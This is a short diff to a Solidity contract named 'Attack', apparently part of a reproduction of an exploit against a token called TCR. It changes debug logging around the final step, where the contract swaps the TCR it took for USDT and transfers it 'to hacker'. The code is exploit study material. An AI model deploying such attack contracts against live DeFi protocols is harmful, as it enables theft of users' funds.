@@ -19,13 +19,6 @@ contract Attack {
     uint256 MAX_INT = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
     address public stakedToken;
 
-//    constructor(address _stakedToken,address _trusty_address) payable {
-//        require(_stakedToken != address(0) , "STAKING: Zero address detected");
-//        owner = payable(msg.sender);
-//        stakedToken = _stakedToken;
-//        _setupRole(TRUSTY_ROLE, _trusty_address);
-//    }
-
     constructor() payable {
         owner = payable(msg.sender);
     }
@@ -82,8 +75,10 @@ contract Attack {
         path2[1] = USDTAddr;
         router.swapExactTokensForTokens(thisTcrBalance, amountOut, path2, address(this), deadline);
         uint256 lastUsdt = USDT.balanceOf(address(this));
-        console.log("%s tcr swap to %s USDT", thisTcrBalance, lastUsdt);
-        console.log("4. Transfer %s USDT to hacker.", lastUsdt);
+        console.log("%s tcr swap to %s USDT %s address", thisTcrBalance, lastUsdt,address(this));
+        console.log("4. Transfer %s USDT to hacker.before", lastUsdt);
         USDT.transfer(msg.sender, lastUsdt);
+        uint256 lastUsdt2 = USDT.balanceOf(address(this));
+        console.log("5. Transfer %s USDT to hacker.after", lastUsdt2);
     }
 }
